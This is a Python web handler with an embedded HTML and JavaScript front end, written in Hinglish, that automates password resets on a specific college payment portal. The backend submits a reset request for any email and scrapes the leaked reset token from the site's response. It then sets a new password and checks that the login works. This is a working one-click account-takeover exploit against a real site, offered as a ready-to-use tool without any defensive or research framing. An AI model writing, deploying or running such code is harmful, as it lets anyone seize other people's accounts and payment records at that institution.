from http.server import BaseHTTPRequestHandler
import json
import re
import requests
from urllib.parse import parse_qs

HTML = r"""<!DOCTYPE html>
<html lang="hi" data-theme="light">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Password Reset • Vanraj College</title>
  <style>
    :root, [data-theme="light"] {
      --primary: #2563eb; --primary-hover: #1d4ed8;
      --bg: #f1f5f9; --card: #ffffff; --text: #0f172a;
      --muted: #64748b; --border: #e2e8f0; --radius: 12px;
      --ok-bg: #dcfce7; --ok-text: #166534; --ok-border: #bbf7d0;
      --err-bg: #fee2e2; --err-text: #991b1b; --err-border: #fecaca;
      --note-bg: #f8fafc; --input-bg: #ffffff; --filled-bg: #f0fdf4;
      --toast-bg: #0f172a; --toast-text: #f8fafc;
    }
    [data-theme="dark"] {
      --primary: #3b82f6; --primary-hover: #60a5fa;
      --bg: #0f172a; --card: #1e293b; --text: #f1f5f9;
      --muted: #94a3b8; --border: #334155;
      --ok-bg: #14532d; --ok-text: #bbf7d0; --ok-border: #166534;
      --err-bg: #7f1d1d; --err-text: #fecaca; --err-border: #991b1b;
      --note-bg: #0f172a; --input-bg: #0f172a; --filled-bg: #14532d;
      --toast-bg: #f1f5f9; --toast-text: #0f172a;
    }
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: system-ui, -apple-system, sans-serif; background: var(--bg);
      min-height: 100vh; display: grid; place-items: center; padding: 1.25rem;
      color: var(--text); transition: background .2s, color .2s;
    }
    .card {
      background: var(--card); width: 100%; max-width: 440px; padding: 2rem;
      border-radius: 16px; box-shadow: 0 8px 30px rgba(0,0,0,.12);
      border: 1px solid var(--border); position: relative;
    }
    .top {
      display: flex; justify-content: space-between; align-items: flex-start;
      margin-bottom: 1.25rem; gap: 1rem;
    }
    h1 { font-size: 1.35rem; font-weight: 700; }
    .sub { color: var(--muted); font-size: .875rem; margin-top: .2rem; }
    #themeBtn {
      background: var(--note-bg); border: 1px solid var(--border); color: var(--text);
      border-radius: 10px; padding: .45rem .7rem; cursor: pointer; font-size: 1.1rem;
      line-height: 1; flex-shrink: 0;
    }
    label { display: block; font-size: .8125rem; font-weight: 500; margin: 1rem 0 .4rem; }
    input {
      width: 100%; padding: .75rem .9rem; border: 1px solid var(--border);
      border-radius: var(--radius); font-size: .95rem;
      background: var(--input-bg); color: var(--text);
    }
    input:focus {
      outline: none; border-color: var(--primary);
      box-shadow: 0 0 0 3px rgba(37,99,235,.2);
    }
    input.filled { border-color: #22c55e; background: var(--filled-bg); }
    .row { display: flex; gap: .5rem; align-items: stretch; }
    .row input { flex: 1; min-width: 0; }
    button {
      padding: .7rem 1rem; background: var(--primary); color: #fff; border: none;
      border-radius: var(--radius); font-size: .875rem; font-weight: 600; cursor: pointer;
      white-space: nowrap;
    }
    button:hover { background: var(--primary-hover); }
    button:disabled { opacity: .65; cursor: not-allowed; }
    button.secondary {
      background: transparent; color: var(--text); border: 1px solid var(--border);
    }
    button.secondary:hover { background: var(--note-bg); }
    button.full { width: 100%; margin-top: 1.25rem; padding: .9rem; font-size: 1rem; }
    button.ghost {
      width: 100%; margin-top: .6rem; padding: .7rem; font-size: .85rem;
      background: transparent; color: var(--muted); border: 1px dashed var(--border);
    }
    button.ghost:hover { color: var(--text); border-style: solid; }
    button.success-btn { background: #16a34a; margin-top: .6rem; }
    button.success-btn:hover { background: #15803d; }
    #advanced { display: none; margin-top: .5rem; }
    #advanced.open { display: block; }
    #result {
      display: none; margin-top: 1.25rem; padding: .9rem 1rem;
      border-radius: var(--radius); font-size: .875rem; line-height: 1.5; word-break: break-all;
    }
    .ok  { background: var(--ok-bg); color: var(--ok-text); border: 1px solid var(--ok-border); }
    .err { background: var(--err-bg); color: var(--err-text); border: 1px solid var(--err-border); }
    .note {
      margin-top: 1.25rem; padding: .85rem; background: var(--note-bg);
      border-radius: 10px; font-size: .78rem; color: var(--muted); line-height: 1.5;
      border: 1px solid var(--border);
    }
    .steps {
      display: flex; gap: .4rem; margin: 1rem 0 .25rem; font-size: .75rem; color: var(--muted);
    }
    .steps span {
      flex: 1; text-align: center; padding: .35rem; border-radius: 8px;
      background: var(--note-bg); border: 1px solid var(--border);
    }
    .steps span.active { color: var(--primary); border-color: var(--primary); font-weight: 600; }
    .steps span.done { color: #22c55e; border-color: #22c55e; }

    /* Progress bar */
    .progress-wrap {
      display: none; margin-top: 1rem;
    }
    .progress-wrap.show { display: block; }
    .progress-label {
      font-size: .8rem; color: var(--muted); margin-bottom: .4rem;
      display: flex; justify-content: space-between;
    }
    .progress-track {
      height: 8px; background: var(--border); border-radius: 99px; overflow: hidden;
    }
    .progress-fill {
      height: 100%; width: 0%; background: var(--primary);
      border-radius: 99px; transition: width .35s ease;
    }
    .progress-fill.indeterminate {
      width: 40% !important;
      animation: slide 1.2s ease-in-out infinite;
    }
    @keyframes slide {
      0% { transform: translateX(-100%); }
      100% { transform: translateX(280%); }
    }

    /* Toast */
    #toasts {
      position: fixed; top: 1rem; right: 1rem; z-index: 9999;
      display: flex; flex-direction: column; gap: .5rem; max-width: min(360px, 92vw);
      pointer-events: none;
    }
    .toast {
      pointer-events: auto;
      background: var(--toast-bg); color: var(--toast-text);
      padding: .85rem 1rem; border-radius: 12px;
      font-size: .875rem; line-height: 1.4;
      box-shadow: 0 10px 30px rgba(0,0,0,.25);
      animation: toastIn .25s ease;
      border-left: 4px solid var(--primary);
    }
    .toast.ok { border-left-color: #22c55e; }
    .toast.err { border-left-color: #ef4444; }
    .toast.hide { animation: toastOut .25s ease forwards; }
    @keyframes toastIn {
      from { opacity: 0; transform: translateY(-8px); }
      to { opacity: 1; transform: translateY(0); }
    }
    @keyframes toastOut {
      to { opacity: 0; transform: translateY(-8px); }
    }
  </style>
</head>
<body>
  <div id="toasts"></div>

  <div class="card">
    <div class="top">
      <div>
        <h1>Password Reset</h1>
        <p class="sub">Vanraj College Payment Portal</p>
      </div>
      <button type="button" id="themeBtn" title="Toggle dark mode">🌙</button>
    </div>

    <div class="steps" id="steps">
      <span id="s1">1. Email</span>
      <span id="s2">2. Token</span>
      <span id="s3">3. Done</span>
    </div>

    <label for="email">Email Address</label>
    <input id="email" type="email" placeholder="registered@email.com" autocomplete="email">

    <label for="password">New Password</label>
    <input id="password" type="password" placeholder="Naya password (min 6)" autocomplete="new-password">

    <div class="progress-wrap" id="progressWrap">
      <div class="progress-label">
        <span id="progressText">Working...</span>
        <span id="progressPct">0%</span>
      </div>
      <div class="progress-track">
        <div class="progress-fill" id="progressFill"></div>
      </div>
    </div>

    <button class="full" id="oneClickBtn">One-Click Reset</button>
    <button class="full success-btn" id="testLoginBtn" style="display:none">Test Login</button>

    <button type="button" class="ghost" id="toggleAdv">Advanced: manual token ▾</button>

    <div id="advanced">
      <label for="token">Reset Token</label>
      <div class="row">
        <input id="token" type="text" placeholder="Auto ya paste">
        <button type="button" class="secondary" id="findBtn">Find</button>
      </div>
      <button class="full" id="manualBtn" style="margin-top:.75rem">Reset with Token</button>
    </div>

    <div id="result"></div>

    <div class="note">
      <b>One-Click:</b> Email + password → auto token + reset.<br>
      Success ke baad <b>Test Login</b> se verify kar sakte ho.
    </div>
  </div>

  <script>
    const $ = id => document.getElementById(id);
    const result = $('result');
    let lastPassword = '';

    // Theme
    (function initTheme() {
      const saved = localStorage.getItem('theme') || 'light';
      document.documentElement.setAttribute('data-theme', saved);
      $('themeBtn').textContent = saved === 'dark' ? '☀️' : '🌙';
    })();
    $('themeBtn').onclick = () => {
      const cur = document.documentElement.getAttribute('data-theme');
      const next = cur === 'dark' ? 'light' : 'dark';
      document.documentElement.setAttribute('data-theme', next);
      localStorage.setItem('theme', next);
      $('themeBtn').textContent = next === 'dark' ? '☀️' : '🌙';
    };

    // Toast
    function toast(msg, ok) {
      const el = document.createElement('div');
      el.className = 'toast ' + (ok ? 'ok' : 'err');
      el.textContent = msg;
      $('toasts').appendChild(el);
      setTimeout(() => {
        el.classList.add('hide');
        setTimeout(() => el.remove(), 250);
      }, 3500);
    }

    function show(msg, ok) {
      result.style.display = 'block';
      result.className = ok ? 'ok' : 'err';
      result.textContent = msg;
      toast(msg.length > 80 ? msg.slice(0, 80) + '…' : msg, ok);
    }

    // Progress
    function progressShow(text, pct, indeterminate) {
      const wrap = $('progressWrap');
      const fill = $('progressFill');
      wrap.classList.add('show');
      $('progressText').textContent = text;
      if (indeterminate) {
        fill.classList.add('indeterminate');
        $('progressPct').textContent = '';
      } else {
        fill.classList.remove('indeterminate');
        fill.style.width = Math.max(0, Math.min(100, pct)) + '%';
        $('progressPct').textContent = Math.round(pct) + '%';
      }
    }
    function progressHide() {
      $('progressWrap').classList.remove('show');
      $('progressFill').classList.remove('indeterminate');
      $('progressFill').style.width = '0%';
    }

    function setStep(n) {
      [1,2,3].forEach(i => {
        const el = $('s' + i);
        el.classList.remove('active', 'done');
        if (i < n) el.classList.add('done');
        if (i === n) el.classList.add('active');
      });
    }

    $('toggleAdv').onclick = () => {
      const adv = $('advanced');
      const open = adv.classList.toggle('open');
      $('toggleAdv').textContent = open ? 'Advanced: manual token ▴' : 'Advanced: manual token ▾';
    };

    async function api(body) {
      const controller = new AbortController();
      const timer = setTimeout(() => controller.abort(), 45000);
      try {
        const res = await fetch('/', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(body),
          signal: controller.signal
        });
        return await res.json();
      } finally {
        clearTimeout(timer);
      }
    }

    function setBusy(busy) {
      ['oneClickBtn','findBtn','manualBtn','testLoginBtn'].forEach(id => {
        const el = $(id);
        if (el) el.disabled = busy;
      });
    }

    async function findTokenOnly() {
      const email = $('email').value.trim();
      if (!email) return show('Pehle email dalo', false);
      setBusy(true);
      setStep(2);
      progressShow('Token dhoondh rahe hain...', 30, true);
      try {
        const data = await api({ action: 'find_token', email });
        progressShow('Token check...', 90, false);
        if (data.success && data.token) {
          $('token').value = data.token;
          $('token').classList.add('filled');
          progressShow('Token mil gaya', 100, false);
          show('Token mil gaya. Ab password set karke reset karo.', true);
        } else {
          show(data.message || 'Token nahi mila', false);
        }
      } catch (e) {
        show(e.name === 'AbortError' ? 'Timeout. Dobara try karo.' : ('Error: ' + e.message), false);
      }
      setTimeout(progressHide, 600);
      setBusy(false);
      $('findBtn').textContent = 'Find';
    }

    async function resetWithToken() {
      const email = $('email').value.trim();
      const token = $('token').value.trim();
      const password = $('password').value.trim();
      if (!email || !token || !password) return show('Email, Token, Password required', false);
      if (password.length < 6) return show('Password min 6 characters', false);
      setBusy(true);
      progressShow('Password reset ho raha hai...', 50, true);
      try {
        const data = await api({ action: 'reset', email, token, password });
        progressShow(data.success ? 'Done' : 'Failed', 100, false);
        if (data.success) {
          setStep(3);
          lastPassword = password;
          $('testLoginBtn').style.display = 'block';
        }
        show(data.message, !!data.success);
      } catch (e) {
        show('Error: ' + e.message, false);
      }
      setTimeout(progressHide, 600);
      setBusy(false);
    }

    async function oneClick() {
      const email = $('email').value.trim();
      const password = $('password').value.trim();

      if (!email || !password) return show('Email aur New Password dono dalo', false);
      if (password.length < 6) return show('Password min 6 characters', false);

      setBusy(true);
      result.style.display = 'none';
      $('testLoginBtn').style.display = 'none';

      try {
        setStep(2);
        progressShow('1/2 Token dhoondh rahe hain...', 15, false);
        const found = await api({ action: 'find_token', email });
        if (!found.success || !found.token) {
          progressShow('Token fail', 100, false);
          show(found.message || 'Token nahi mila', false);
          return;
        }
        $('token').value = found.token;
        $('token').classList.add('filled');
        progressShow('2/2 Password reset ho raha hai...', 55, false);

        const done = await api({
          action: 'reset', email, token: found.token, password
        });
        progressShow(done.success ? 'Complete!' : 'Failed', 100, false);
        if (done.success) {
          setStep(3);
          lastPassword = password;
          $('testLoginBtn').style.display = 'block';
        }
        show(done.message, !!done.success);
      } catch (e) {
        show(e.name === 'AbortError' ? 'Timeout (server slow). Dobara try karo.' : ('Error: ' + e.message), false);
      } finally {
        setTimeout(progressHide, 800);
        setBusy(false);
        $('oneClickBtn').textContent = 'One-Click Reset';
      }
    }

    async function testLogin() {
      const email = $('email').value.trim();
      const password = $('password').value.trim() || lastPassword;
      if (!email || !password) return show('Email aur password chahiye login test ke liye', false);

      setBusy(true);
      progressShow('Login test ho raha hai...', 40, true);
      try {
        const data = await api({ action: 'test_login', email, password });
        progressShow(data.success ? 'Login OK' : 'Login fail', 100, false);
        show(data.message, !!data.success);
      } catch (e) {
        show('Error: ' + e.message, false);
      }
      setTimeout(progressHide, 600);
      setBusy(false);
    }

    setStep(1);
    $('email').addEventListener('input', () => setStep(1));
    $('findBtn').onclick = findTokenOnly;
    $('manualBtn').onclick = resetWithToken;
    $('oneClickBtn').onclick = oneClick;
    $('testLoginBtn').onclick = testLogin;
    document.addEventListener('keydown', e => {
      if (e.key === 'Enter') oneClick();
    });
  </script>
</body>
</html>
"""


def find_token(email: str):
    BASE_URL = "https://payment.vaccdharampur.org"
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    })

    r = session.get(f"{BASE_URL}/password/reset", timeout=20)
    if r.status_code != 200:
        return {"success": False, "message": f"Reset page open nahi hua ({r.status_code})"}

    m = re.search(r'name="_token"\s+value="([^"]+)"', r.text)
    if not m:
        return {"success": False, "message": "CSRF token nahi mila"}
    csrf = m.group(1)

    post = session.post(
        f"{BASE_URL}/password/email",
        data={"_token": csrf, "email": email},
        headers={"Referer": f"{BASE_URL}/password/reset", "Origin": BASE_URL},
        timeout=25,
    )

    tokens = re.findall(r"password/reset/([a-f0-9]{60,})", post.text, re.I)
    if tokens:
        token = tokens[0]
        return {
            "success": True,
            "token": token,
            "message": "Token mil gaya",
            "reset_url": f"{BASE_URL}/password/reset/{token}",
        }

    text_lower = post.text.lower()
    if "no valid recipients" in text_lower or "swift_transport" in text_lower:
        return {
            "success": False,
            "message": "SMTP error aaya lekin token extract nahi hua. Dobara try karo.",
        }

    return {
        "success": False,
        "message": f"Token nahi mila (HTTP {post.status_code}).",
    }


def reset_password(email: str, token: str, password: str):
    BASE_URL = "https://payment.vaccdharampur.org"
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    })

    reset_url = f"{BASE_URL}/password/reset/{token}"
    resp = session.get(reset_url, timeout=15)

    if resp.status_code != 200:
        raise Exception(f"Reset page open nahi hua ({resp.status_code}). Token expire/invalid.")

    csrf_token = None
    if 'name="_token"' in resp.text:
        start = resp.text.find('name="_token" value="') + len('name="_token" value="')
        end = resp.text.find('"', start)
        csrf_token = resp.text[start:end]

    if not csrf_token:
        raise Exception("CSRF token nahi mila.")

    payload = {
        "_token": csrf_token,
        "token": token,
        "email": email,
        "password": password,
        "password_confirmation": password,
    }

    post_resp = session.post(
        f"{BASE_URL}/password/reset",
        data=payload,
        headers={"Referer": reset_url, "Origin": BASE_URL},
        allow_redirects=True,
        timeout=15,
    )

    text_lower = post_resp.text.lower()
    final_url = post_resp.url.lower().rstrip("/")

    success = (
        "password has been reset" in text_lower
        or final_url.endswith("/home")
        or "/home" in final_url
        or final_url.endswith("/login")
        or "/login" in final_url
        or final_url.endswith("/dashboard")
    )

    if "/password/reset" in final_url and (
        "invalid" in text_lower or "expired" in text_lower or "can't find" in text_lower
    ):
        success = False

    if success:
        message = "Password reset successful! Ab Test Login se verify karo."
    elif "can't find a user" in text_lower:
        message = "Is email se koi account nahi mila."
    elif "token" in text_lower and ("invalid" in text_lower or "expired" in text_lower):
        message = "Token invalid/expire. Dobara One-Click try karo."
    else:
        message = f"Reset fail. URL: {post_resp.url}"

    return {
        "success": success,
        "message": message,
        "status_code": post_resp.status_code,
        "final_url": post_resp.url,
    }


def test_login(email: str, password: str):
    BASE_URL = "https://payment.vaccdharampur.org"
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    })

    r = session.get(f"{BASE_URL}/login", timeout=15)
    if r.status_code != 200:
        return {"success": False, "message": f"Login page open nahi hua ({r.status_code})"}

    m = re.search(r'name="_token"\s+value="([^"]+)"', r.text)
    if not m:
        return {"success": False, "message": "Login CSRF nahi mila"}
    csrf = m.group(1)

    post = session.post(
        f"{BASE_URL}/login",
        data={"_token": csrf, "email": email, "password": password},
        headers={"Referer": f"{BASE_URL}/login", "Origin": BASE_URL},
        allow_redirects=True,
        timeout=15,
    )

    final_url = post.url.lower().rstrip("/")
    text_lower = post.text.lower()

    success = (
        final_url.endswith("/home")
        or "/home" in final_url
        or final_url.endswith("/dashboard")
        or "/dashboard" in final_url
    )

    # Still on login page with error
    if "/login" in final_url and (
        "credentials" in text_lower
        or "invalid" in text_lower
        or "incorrect" in text_lower
        or "these credentials do not match" in text_lower
    ):
        success = False

    if success:
        message = "Login successful! Password sahi set hai."
    else:
        message = "Login fail. Password galat ho sakta hai ya account lock."

    return {
        "success": success,
        "message": message,
        "final_url": post.url,
        "status_code": post.status_code,
    }


class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html; charset=utf-8")
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(HTML.encode("utf-8"))

    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length).decode("utf-8")

        try:
            data = json.loads(body)
        except Exception:
            data = parse_qs(body)
            data = {k: v[0] for k, v in data.items()}

        action = (data.get("action") or "reset").strip()
        email = (data.get("email") or "").strip()

        try:
            if action == "find_token":
                if not email:
                    return self._json(400, {"success": False, "message": "Email required"})
                return self._json(200, find_token(email))

            if action == "test_login":
                password = (data.get("password") or "").strip()
                if not email or not password:
                    return self._json(400, {"success": False, "message": "Email aur password required"})
                return self._json(200, test_login(email, password))

            token = (data.get("token") or "").strip()
            password = (data.get("password") or "").strip()

            if not email or not token or not password:
                return self._json(400, {
                    "success": False,
                    "message": "Email, Token aur Password sab required hain",
                })

            return self._json(200, reset_password(email, token, password))

        except Exception as e:
            return self._json(500, {"success": False, "message": f"Error: {str(e)}"})

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def _json(self, status, data):
        self.send_response(status)
        self.send_header("Content-type", "application/json")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())
